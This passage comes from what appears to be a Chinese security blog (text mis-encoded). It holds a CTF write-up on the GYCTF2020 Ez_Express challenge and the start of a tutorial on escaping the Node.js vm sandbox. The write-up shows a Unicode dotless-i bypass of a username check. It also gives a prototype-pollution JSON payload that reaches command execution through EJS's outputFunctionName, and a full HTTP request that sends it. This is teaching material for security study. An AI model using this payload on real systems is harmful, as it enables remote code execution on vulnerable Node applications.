router;\n\n```\n\nçœ‹ä¸‹é¢ä¸¤æ®µä»£ç \n\n```JavaScript\nfunction safeKeyword(keyword) {\n  if(keyword.match(/(admin)/is)) {\n      return keyword\n  }\n\n  return undefined\n}\n```\n\n```JavaScript\nrouter.post('/login', function (req, res) {\n  if(req.body.Submit==\"register\"){\n   if(safeKeyword(req.body.userid)){\n    res.end(\"<script>alert('forbid word');history.go(-1);</script>\") \n   }\n    req.session.user={\n      'user':req.body.userid.toUpperCase(),\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }\n    res.redirect('/'); \n  }\n  else if(req.body.Submit==\"login\"){\n    if(!req.session.user){res.end(\"<script>alert('register first');history.go(-1);</script>\")}\n    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){\n      req.session.user.isLogin=true;\n    }\n    else{\n      res.end(\"<script>alert('error passwd');history.go(-1);</script>\")\n    }\n  \n  }\n  res.redirect('/'); ;\n});\n```\n\nåªæœ‰ç”¨adminç™»å½•æ‰ä¼šreturn keyword å¦åˆ™è¿”å›undefined è¿”å›undefinedå°±ä¼šå¼¹çª—forbid word å¦‚æœusernameç»è¿‡toUpperCaseåä¸èƒ½ä¸åŸæ¥çš„åŒ¹é… æˆ–passwordé”™è¯¯ å°±ä¼šå¼¹çª—error passwd è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆé¢˜ä¸­è¯´ç”¨æˆ·ååªæ”¯æŒå¤§å†™\n\nå†çœ‹è¿™æ®µ å°±å¾ˆæ¶å¿ƒ å¦‚æœusernameä¸ºADMINå°±ä¸èƒ½ç™»å½• åˆä¸è®©ç”¨admin åˆå¾—ç”¨adminç™»å½• è¿™é‡Œå°±ç”¨åˆ°äº†JavaScriptå¤§å°å†™çš„æ¼æ´\n\nåŸç†ç§»æ­¥pç¥åšå®¢ [Fuzzä¸­çš„javascriptå¤§å°å†™ç‰¹æ€§ | ç¦»åˆ«æ­Œ (leavesongs.com)](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)\n\n```javascript\nif(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n```\n\næ‰€ä»¥ç”¨`ADMÄ±N`æ¥ç»•è¿‡ æ³¨æ„ä¸æ˜¯ADMiN ä¸­é—´é‚£ä¸ªiæ˜¯ä¸€ä¸ªå¥‡æ€ªçš„å­—ç¬¦ æŠŠusernameè¾“å…¥ADMÄ±Nç›´æ¥æ³¨å†Œå°±å¯ä»¥äº†ï¼ˆé¢˜ç›®ç¯å¢ƒæ€ªæ€ªçš„ æœ‰çš„æ—¶å€™ADMÄ±N ä¸è¡Œå°±è¯•è¯•admÄ±nï¼‰ç™»å½•è¿›å»è¿˜ç»™äº†flagçš„ä½ç½®\n\n![](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208032133466.png)\n\n![image-20220803213711682](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208032137738.png)\n\nè¿™é‡Œè¯•äº†è¯•æ²¡å•¥ç”¨ ç»§ç»­çœ‹æºç  ä¸Šé¢æåˆ°äº† merge cloneæ“ä½œå¯ä»¥æ§åˆ¶é”®å€¼å’Œé”®å ä»è€Œè¾¾åˆ°æ±¡æŸ“\n\n```JavaScript\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}const merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n```\n\nå¾€ä¸‹çœ‹æ‰¾åˆ°è°ƒç”¨cloneçš„ä½ç½®\n\n```javascript\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\n```\n\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨actionè·¯ç”±ä¸‹é€šè¿‡è¯·æ±‚ä½“æ¥è¿›è¡Œæ±¡æŸ“ åŸå‹é“¾æ±¡æŸ“çš„ä½ç½®æ‰¾åˆ°äº† æ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾åˆ°å¯ä»¥ç”¨æ¥æ§åˆ¶é”®åå’Œé”®å€¼çš„å¯¹è±¡\n\nçœ‹åˆ°è¿™æ®µ\n\n```javascript\nrouter.get('/info', function (req, res) {\n  res.render('index',data={'user':res.outputFunctionName});\n})\n```\n\nrenderå‡½æ•°åº”è¯¥ä¸é™Œç”Ÿ åœ¨æ¨¡æ¿æ³¨å…¥æ”»å‡»ï¼ˆSSTIï¼‰ä¸­å¾ˆå¸¸è§  è¿™é‡Œå°†å›æ˜¾reqçš„outputFunctionNmaeæ¸²æŸ“åˆ°äº†indexä¸­ é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨outputFunctionNameè¿›è¡ŒSSTIä»è€Œè¾¾åˆ°rceå‘¢ ä»£ç è·Ÿä¸‹æ¥æˆ‘ä»¬å‘ç°å¹¶æ²¡æœ‰outputFunctionNameè¿™ä¸ªä¸œè¥¿ ä¹Ÿå°±æ˜¯è¯´å®ƒæ˜¯æˆ‘ä»¬å¯ä»¥ç”¨æ¥æ±¡æŸ“åŸå‹é“¾çš„è½½ä½“ å¦‚æœæŠŠObjectçš„prototypeä¸­åŠ ä¸Šé”®åä¸ºoutputFunctionName é”®å€¼ä¸ºæ¶æ„payloadçš„å±æ€§ é‚£ä¹ˆåœ¨è¿›è¡Œæ¨¡æ¿æ¸²æŸ“æ—¶ æ˜¯ä¸æ˜¯å°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„payload\n\nä½†æ˜¯æˆ‘ä»¬è€ƒè™‘ä¸€ä¸ªé—®é¢˜ å¦‚ä½•å»ä¿®æ”¹Objectçš„prototype ï¼ˆç¡®å®æ˜¯å¯ä»¥çš„ ä½†æ˜¯æœ‰ç‚¹éº»çƒ¦ ä¸‹é¢å‚è€ƒæ–‡ç« çš„æœ€åä¸€ç¯‡å°±æ˜¯ç›´æ¥ä¿®æ”¹Objectçš„prototyprï¼‰æˆ‘ä»¬é‡æ–°å›åˆ°è¿™æ®µä»£ç \n\n```JavaScript\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\n```\n\nå‘ç°è¯·æ±‚ä½“è¢«cloneåˆ°äº†req.session.user.dataä¸­ å¯¹äºreq.session.userè¿™ä¸ªå¯¹è±¡æ¥è¯´ å®ƒçš„`__proto__`å±æ€§æ˜¯ä¸æ˜¯å°±æ˜¯Objectçš„prototype æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹äº†è¿™ä¸ªå¯¹è±¡çš„`__proto__`ä»è€Œè¾¾åˆ°ç›®çš„\n\n```JavaScript\nreq.session.user={\n      'user':req.body.userid.toUpperCase(),\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }\n```\n\nSSTIçš„payloadæˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ åæ­£åŸç†éƒ½æ˜¯ä¸æ–­è°ƒç”¨åŸå‹å¯¹è±¡ æœ€åæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥ç”¨æ¥rceçš„å‡½æ•° payloadå’Œ`CVE-2019-10744`æ˜¯ä¸€æ ·çš„ ç›´æ¥æ¬æ¥ç”¨äº†\n\n```javascript\n{\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//\"}}\n```\n\næ±¡æŸ“æˆåŠŸååœ¨infoè·¯ç”±ä¸‹è°ƒç”¨res.outputFunctionNameæ—¶ å°±åƒä¸Šé¢è°ƒç”¨`son.last_name`çš„è¿‡ç¨‹ä¸€æ · æœ€ç»ˆè°ƒç”¨åˆ°äº†Objectçš„outputFunctionName å¹¶ä¸”è¦è®©`__proto__`ä¸ºé”®å è¦ç”¨JSONæ ¼å¼ æ‰€ä»¥è¦ç”¨burpæ‹¦åŒ…æ·»åŠ content typeï¼ˆåœ¨è¿›è¡ŒPOSTä¼ å‚æ—¶å¿…é¡»æœ‰è¯¥å¤´ï¼‰ æ”¾ä¸ªåŒ…åšä¸ªå‚è€ƒ è®°å¾—è·¯ç”±å’Œä¼ å‚æ–¹å¼ä¹Ÿè¦æ”¹ å†ä¼ payload\n\n```shell\nPOST /action HTTP/1.1\nHost: 8f9161b2-5acd-465d-8854-969004e758fb.node4.buuoj.cn:81\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://8f9161b2-5acd-465d-8854-969004e758fb.node4.buuoj.cn:81/login\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: session=s%3A1jilnCKBesMA5qC1gPlt6SPb18ntn7h7.4wyQ3TbDJtVXUhdOdErxMFKs6EcCnNrCkeUjRFYK3MY\nContent-Type: application/json\nConnection: close\nContent-Length: 137\n\n{\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//\"}}\n\n```\n\nåœ¨actionè·¯ç”±ä¸‹æ±¡æŸ“æˆåŠŸååº”è¯¥æ¥ç€è®¿é—®infoè·¯ç”±è¿›è¡ŒSSTI ä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥æˆ‘åŒ…å‘è¿‡å»ç›´æ¥ç»™flagäº† \n\n![image-20220803221639344](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208032216423.png)\n\n## å‚è€ƒæ–‡ç« \n\n[æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡» | ç¦»åˆ«æ­Œ (leavesongs.com)](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript)\n\n[ã€å…¨ç½‘é¦–å‘:å·²å®Œç»“ã€‘å¿«é€Ÿææ‡‚ã€åŸå‹ã€åŸå‹é“¾ã€ã€JavaScriptåŸºç¡€ä¸“é¢˜ã€‘_å“”å“©å“”å“©_bilibili](https://www.bilibili.com/video/BV1ci4y157Ci?p=1&vd_source=ce28d3130b8ba56f85e090c857c00132)\n\n [GYCTF2020\\]Ez_Express åŸå‹é“¾æ±¡æŸ“_-æ €è“-çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/qq_54929891/article/details/124556857?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-124556857-blog-125721365.pc_relevant_multi_platform_featuressortv2removedup&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-124556857-blog-125721365.pc_relevant_multi_platform_featuressortv2removedup&utm_relevant_index=2)\n\n[Fuzzä¸­çš„javascriptå¤§å°å†™ç‰¹æ€§ | ç¦»åˆ«æ­Œ (leavesongs.com)](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)\n\n [Web/Nodejs\\]åŸå‹é“¾æ±¡æŸ“EJSæ¨¡å—çš„åˆ©ç”¨åˆ†æ(é™„æºç åˆ†æ)_è»ŠéˆŠçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/DARKNOTES/article/details/124000520)\n\nhttps://xz.aliyun.com/t/6113#toc-4\n","tags":["åŸå‹é“¾æ±¡æŸ“"],"categories":["WebSec"]},{"title":"VMæ²™ç®±é€ƒé€¸","url":"/2023/04/20/VMæ²™ç®±é€ƒé€¸/","content":"\n\n\n**å‚è€ƒæ–‡ç« **ï¼šhttps://blog.csdn.net/m0_62063669/article/details/125441529\n\nâ€‹\t\t\t\t\thttps://blog.csdn.net/u012961419/article/details/121281538\n\nâ€‹\t\t\t\t\thttps://blog.csdn.net/sunyctf/article/details/124434565\n\nâ€‹\t\t\t\t\thttps://www.mianshigee.com/note/detail/27897wlr/#script-runinnewcontext-sandbox-options\n\nâ€‹\t\t\t\t\thttps://blog.csdn.net/shawdow_bug/article/details/120072209?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&utm_relevant_index=2\n\n[Proxy å’Œ Reflect - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6844904090116292616)\n\n[vm2å®ç°åŸç†åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/207283#h2-1)\n\nâ€‹\t\t\t\t\t**Pç¥çŸ¥è¯†æ˜Ÿçƒ**\n\nâ€‹\t\t\t\t\t\n\n## **0x01 æ²™ç®±é€ƒé€¸åˆè¯†**\n\nè¯´åˆ°æ²™ç®±é€ƒé€¸ï¼Œæˆ‘ä»¬å…ˆæ¥æ˜ç¡®ä¸€äº›åŸºæœ¬çš„æ¦‚å¿µã€‚\n\n- JavaScriptå’ŒNodejsä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼šJavaScriptç”¨åœ¨æµè§ˆå™¨å‰ç«¯ï¼Œåæ¥å°†Chromeä¸­çš„v8å¼•æ“å•ç‹¬æ‹¿å‡ºæ¥ä¸ºJavaScriptå•ç‹¬å¼€å‘äº†ä¸€ä¸ªè¿è¡Œç¯å¢ƒï¼Œå› æ­¤JavaScriptä¹Ÿå¯ä»¥ä½œä¸ºä¸€é—¨åç«¯è¯­è¨€ï¼Œå†™åœ¨åç«¯ï¼ˆæœåŠ¡ç«¯ï¼‰çš„JavaScriptå°±å«å«åšNodejsã€‚\n- ä»€ä¹ˆæ˜¯æ²™ç®±ï¼ˆsandboxï¼‰å½“æˆ‘ä»¬è¿è¡Œä¸€äº›å¯èƒ½ä¼šäº§ç”Ÿå±å®³çš„ç¨‹åºï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨ä¸»æœºçš„çœŸå®ç¯å¢ƒä¸Šè¿›è¡Œæµ‹è¯•ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å•ç‹¬å¼€è¾Ÿä¸€ä¸ªè¿è¡Œä»£ç çš„ç¯å¢ƒï¼Œå®ƒä¸ä¸»æœºç›¸äº’éš”ç¦»ï¼Œä½†ä½¿ç”¨ä¸»æœºçš„ç¡¬ä»¶èµ„æºï¼Œæˆ‘ä»¬å°†æœ‰å±å®³çš„ä»£ç åœ¨æ²™ç®±ä¸­è¿è¡Œåªä¼šå¯¹æ²™ç®±å†…éƒ¨äº§ç”Ÿä¸€äº›å½±å“ï¼Œè€Œä¸ä¼šå½±å“åˆ°ä¸»æœºä¸Šçš„åŠŸèƒ½ï¼Œæ²™ç®±çš„å·¥ä½œæœºåˆ¶ä¸»è¦æ˜¯ä¾é é‡å®šå‘ï¼Œå°†æ¶æ„ä»£ç çš„æ‰§è¡Œç›®æ ‡é‡å®šå‘åˆ°æ²™ç®±å†…éƒ¨ã€‚\n- æ²™ç®±ï¼ˆsandboxï¼‰å’Œ è™šæ‹Ÿæœºï¼ˆVMï¼‰å’Œ å®¹å™¨ï¼ˆDockerï¼‰ä¹‹é—´çš„åŒºåˆ«ï¼šsandboxå’ŒVMä½¿ç”¨çš„éƒ½æ˜¯è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œä½†äºŒè€…é—´ä½¿ç”¨çš„ç›®çš„ä¸ä¸€æ ·ã€‚æ²™ç®±ç”¨æ¥éš”ç¦»æœ‰å®³ç¨‹åºï¼Œè€Œè™šæ‹Ÿæœºåˆ™å®ç°äº†æˆ‘ä»¬åœ¨ä¸€å°ç”µè„‘ä¸Šä½¿ç”¨å¤šä¸ªæ“ä½œç³»ç»Ÿçš„åŠŸèƒ½ã€‚Dockerå±äºsandboxçš„ä¸€ç§ï¼Œé€šè¿‡åˆ›é€ ä¸€ä¸ªæœ‰è¾¹ç•Œçš„è¿è¡Œç¯å¢ƒå°†ç¨‹åºæ”¾åœ¨é‡Œé¢ï¼Œä½¿ç¨‹åºè¢«è¾¹ç•Œå›°ä½ï¼Œä»è€Œä½¿ç¨‹åºä¸ç¨‹åºï¼Œç¨‹åºä¸ä¸»æœºä¹‹é—´ç›¸äº’éš”ç¦»å¼€ã€‚åœ¨å®é™…é˜²æŠ¤æ—¶ï¼Œä½¿ç”¨Dockerå’ŒsandboxåµŒå¥—çš„æ–¹å¼æ›´å¤šä¸€ç‚¹ï¼Œå®‰å…¨æ€§ä¹Ÿæ›´é«˜ã€‚\n- åœ¨Nodejsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•å…¥vmæ¨¡å—æ¥åˆ›å»ºä¸€ä¸ªâ€œæ²™ç®±â€ï¼Œä½†å…¶å®è¿™ä¸ªvmæ¨¡å—çš„éš”ç¦»åŠŸèƒ½å¹¶ä¸å®Œå–„ï¼Œè¿˜æœ‰å¾ˆå¤šç¼ºé™·ï¼Œå› æ­¤Nodeåç»­å‡çº§äº†vmï¼Œä¹Ÿå°±æ˜¯ç°åœ¨çš„vm2æ²™ç®±ï¼Œvm2å¼•ç”¨äº†vmæ¨¡å—çš„åŠŸèƒ½ï¼Œå¹¶åœ¨å…¶åŸºç¡€ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ã€‚\n\n## **0x02 Nodeå°†å­—ç¬¦ä¸²æ‰§è¡Œä¸ºä»£ç **\n\næˆ‘ä»¬å…ˆæ¥çœ‹ä¸¤ä¸ªåœ¨nodeä¸­å°†æŠŠå­—ç¬¦ä¸²æ‰§è¡Œæˆä»£ç çš„æ–¹å¼ã€‚\n\n**æ–¹æ³•ä¸€ eval**\n\né¦–å…ˆæˆ‘åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªage.txt\n\n```javascript\nvar age = 18\n```\n\nåˆ›å»ºä¸€ä¸ªy1.js\n\n```javascript\nconst fs = require('fs')\n\nlet content = fs.readFileSync('age.txt', 'utf-8')\n\nconsole.log(content)\n\neval(content)\n\nconsole.log(age)\n```\n\n![image-20221010091326622](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210100913712.png)\n\nå¯ä»¥å‘ç°æˆ‘ä»¬é€šè¿‡evalæ‰§è¡Œäº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™ç§æ‰§è¡Œæ–¹å¼å¦‚æœåœ¨å½“å‰ä½œç”¨åŸŸä¸‹å·²ç»æœ‰äº†åŒåçš„ageå˜é‡ï¼Œè¿™ä¸ªç¨‹åºå°±ä¼šæŠ¥é”™ã€‚\n\n![image-20221010091728679](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210100917743.png)\n\nåœ¨jsä¸­æ¯ä¸€ä¸ªæ¨¡å—éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ä½œç”¨åŸŸï¼Œæ‰€ä»¥ç”¨evalæ‰§è¡Œå­—ç¬¦ä¸²ä»£ç å¾ˆå®¹æ˜“å‡ºç°ä¸Šé¢çš„è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å†çœ‹å¦å¤–ä¸€ç§æ–¹æ³•ã€‚\n\n\n\n**æ–¹æ³•äºŒï¼šnew Function**\n\nä¸Šé¢çš„æ–¹æ³•å› ä¸ºæ¨¡å—é—´çš„ä½œç”¨åŸŸè¢«é™åˆ¶äº†ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹å¦‚æœèƒ½å¤Ÿè‡ªå·±åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸæ˜¯ä¸æ˜¯å°±å¯ä»¥æ›´åŠ æ–¹ä¾¿çš„æ‰§è¡Œä»£ç å‘¢ï¼Ÿnew Functionçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å½¢å‚åç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‡½æ•°ä½“ã€‚\n\n![image-20221010092417799](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210100924849.png)\n\næˆ‘ä»¬éƒ½çŸ¥é“å‡½æ•°å†…å’Œå‡½æ•°å¤–æ˜¯ä¸¤ä¸ªä½œç”¨åŸŸï¼Œä¸è¿‡å½“åœ¨å‡½æ•°ä¸­çš„ä½œç”¨åŸŸæƒ³è¦ä½¿ç”¨å‡½æ•°å¤–çš„å˜é‡æ—¶ï¼Œè¦é€šè¿‡å½¢å‚æ¥ä¼ é€’ï¼Œå½“å‚æ•°è¿‡å¤šæ—¶è¿™ç§æ–¹æ³•å°±å˜çš„éº»çƒ¦èµ·æ¥äº†ã€‚\n\n\n\nä»ä¸Šé¢ä¸¤ä¸ªæ‰§è¡Œä»£ç çš„ä¾‹å­å¯ä»¥çœ‹å‡ºæ¥å…¶å®æˆ‘ä»¬çš„æ€æƒ³å°±æ˜¯å¦‚ä½•åˆ›å»ºä¸€ä¸ª**èƒ½å¤Ÿé€šè¿‡ä¼ ä¸€ä¸ªå­—ç¬¦ä¸²å°±èƒ½æ‰§è¡Œä»£ç ï¼Œå¹¶ä¸”è¿˜ä¸å¤–éƒ¨éš”ç»çš„ä½œç”¨åŸŸ**ï¼Œè¿™ä¹Ÿå°±æ˜¯vmæ¨¡å—çš„ä½œç”¨ã€‚\n\n## **0x03 Nodejsä½œç”¨åŸŸ**\n\n\n\nè¯´åˆ°ä½œç”¨åŸŸï¼Œæˆ‘ä»¬å°±è¦è¯´ä¸€ä¸‹Nodeä¸­çš„ä½œç”¨åŸŸæ˜¯æ€ä¹ˆåˆ†é…çš„ï¼ˆåœ¨Nodeä¸­ä¸€èˆ¬æŠŠä½œç”¨åŸŸå«ä¸Šä¸‹æ–‡ï¼‰ã€‚\n\nåœ¨Webç«¯ï¼ˆæµè§ˆå™¨ï¼‰ï¼Œå‘æŒ¥ä½œç”¨çš„ä¸€èˆ¬æ˜¯JavaScriptï¼Œå­¦è¿‡JavaScriptçš„å¸ˆå‚…åº”è¯¥éƒ½çŸ¥é“æˆ‘ä»¬æ‰“å¼€æµè§ˆå™¨çš„çª—å£æ˜¯JavaScriptä¸­æœ€å¤§çš„å¯¹è±¡`window`ï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯å‘æŒ¥ä½œç”¨çš„Nodeå®ƒçš„æ„é€ å’ŒJavaScriptä¸å¤ªä¸€æ ·ã€‚\n\næˆ‘ä»¬åœ¨å†™ä¸€ä¸ªNodeé¡¹ç›®æ—¶å¾€å¾€è¦åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œruquireå…¶ä»–çš„jsæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶æˆ‘ä»¬éƒ½ç»™å®ƒä»¬å«åšâ€œåŒ…â€ã€‚æ¯ä¸€ä¸ªåŒ…éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ä¸Šä¸‹æ–‡ï¼ŒåŒ…ä¹‹é—´çš„ä½œç”¨åŸŸæ˜¯äº’ç›¸éš”ç¦»ä¸äº’é€šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å°±ç®—æˆ‘åœ¨y1.jsä¸­requireäº†y2.jsï¼Œé‚£ä¹ˆæˆ‘åœ¨y1.jsä¸­ä¹Ÿæ— æ³•ç›´æ¥è°ƒç”¨y2.jsä¸­çš„å˜é‡å’Œå‡½æ•°ï¼Œä¸¾ä¸ªä¾‹å­ã€‚\n\nåœ¨åŒä¸€çº§ç›®å½•ä¸‹æœ‰`y1.js`å’Œ`y2.js`ä¸¤ä¸ªæ–‡ä»¶\n\n`y1.js`\n\n```javascript\nvar age = 20\n```\n\n`y2.js`\n\n```javascript\nconst a = require(\"./y1\")\n\nconsole.log(a.age)\n```\n\nè¿è¡Œy2.jså‘ç°æŠ¥é”™ `age` å€¼ä¸ºundefined\n\n![image-20221012144134438](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121441474.png)\n\n\n\né‚£ä¹ˆæˆ‘ä»¬æƒ³y2ä¸­å¼•å…¥å¹¶ä½¿ç”¨y1ä¸­çš„å…ƒç´ åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼ŒNodeç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå°†jsæ–‡ä»¶ä¸­å…ƒç´ è¾“å‡ºçš„æ¥å£`exports` ï¼ŒæŠŠy1ä¿®æ”¹æˆä¸‹é¢è¿™æ ·ï¼š\n\n`y1.js`\n\n```javascript\nvar age = 20\n\nexports.age = age\n```\n\næˆ‘ä»¬å†è¿è¡Œy2å°±å¯ä»¥æ‹¿åˆ°ageçš„å€¼äº†\n\n![](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121445172.png)\n\næˆ‘ä»¬ç”¨å›¾æ¥è§£é‡Šè¿™ä¸¤ä¸ªåŒ…ä¹‹é—´çš„å…³ç³»å°±æ˜¯\n\n![image-20221012144913712](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121449758.png)\n\nè¿™ä¸ªæ—¶å€™å°±æœ‰äººä¼šé—®å·¦ä¸Šè§’çš„globalæ˜¯ä»€ä¹ˆï¼Ÿè¿™é‡Œå°±è¦è¯´åˆ°Nodejsä¸­çš„å…¨å±€å¯¹è±¡äº†ã€‚\n\nåˆšæ‰æˆ‘ä»¬æåˆ°åœ¨JavaScriptä¸­`window`æ˜¯å…¨å±€å¯¹è±¡ï¼Œæµè§ˆå™¨å…¶ä»–æ‰€æœ‰çš„å±æ€§éƒ½æŒ‚è½½åœ¨`window`ä¸‹ï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯çš„Nodejsä¸­å’Œ`window`ç±»ä¼¼çš„å…¨å±€å¯¹è±¡å«åš`global`ï¼ŒNodejsä¸‹å…¶ä»–çš„æ‰€æœ‰å±æ€§å’ŒåŒ…éƒ½æŒ‚è½½åœ¨è¿™ä¸ªglobalå¯¹è±¡ä¸‹ã€‚åœ¨globalä¸‹æŒ‚è½½äº†ä¸€äº›å…¨å±€å˜é‡ï¼Œæˆ‘ä»¬åœ¨è®¿é—®è¿™äº›å…¨å±€å˜é‡æ—¶ä¸éœ€è¦ç”¨`global.xxx`çš„æ–¹å¼æ¥è®¿é—®ï¼Œç›´æ¥ç”¨`xxx`å°±å¯ä»¥è°ƒç”¨è¿™ä¸ªå˜é‡ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œ`console`å°±æ˜¯æŒ‚è½½åœ¨globalä¸‹çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæˆ‘ä»¬åœ¨ç”¨`console.log`è¾“å‡ºæ—¶å¹¶ä¸éœ€è¦å†™æˆ`global.console.log`ï¼Œå…¶ä»–å¸¸è§å…¨å±€å˜é‡è¿˜æœ‰processï¼ˆä¸€ä¼šé€ƒé€¸è¦ç”¨åˆ°ï¼‰ã€‚\n\næˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨å£°æ˜ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä½†å…¨å±€å˜é‡åœ¨æ¯ä¸ªåŒ…ä¸­éƒ½æ˜¯å…±äº«çš„ï¼Œæ‰€ä»¥å°½é‡ä¸è¦å£°æ˜å…¨å±€å˜é‡ï¼Œä¸ç„¶å®¹æ˜“å¯¼è‡´å˜é‡æ±¡æŸ“ã€‚ç”¨ä¸Šé¢çš„ä»£ç ä¸¾ä¸ªä¾‹å­ï¼š\n\n`y1.js`\n\n```javascript\nglobal.age = 20\n```\n\n `y2.js`\n\n```javascript\nconst a = require(\"./y1\")\n\nconsole.log(age)\n```\n\nè¾“å‡ºï¼š\n\n![image-20221012150333572](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121503613.png)\n\nå¯ä»¥å‘ç°æˆ‘è¿™æ¬¡åœ¨y1ä¸­å¹¶æ²¡æœ‰ä½¿ç”¨`exports`å°†ageå¯¼å…¥ï¼Œå¹¶ä¸”y2åœ¨è¾“å‡ºæ—¶ä¹Ÿæ²¡æœ‰ç”¨`a.age`ï¼Œå› ä¸ºæ­¤æ—¶ageå·²ç»æŒ‚è½½åœ¨globalä¸Šäº†ï¼Œå®ƒçš„ä½œç”¨åŸŸå·²ç»ä¸åœ¨y1ä¸­äº†ã€‚\n\næˆ‘ä»¬è¾“å‡ºä¸€ä¸‹globalå¯¹è±¡ï¼Œå¯ä»¥çœ‹åˆ°ageç¡®å®æŒ‚è½½åœ¨äº†globalä¸Šï¼š\n\n```json\n<ref *1> Object [global] {\n  global: [Circular *1],\n  clearInterval: [Function: clearInterval],\n  clearTimeout: [Function: clearTimeout],\n  setInterval: [Function: setInterval],\n  setTimeout: [Function: setTimeout] {\n    [Symbol(nodejs.util.promisify.custom)]: [Getter]\n  },\n  queueMicrotask: [Function: queueMicrotask],\n  performance: Performance {\n    nodeTiming: 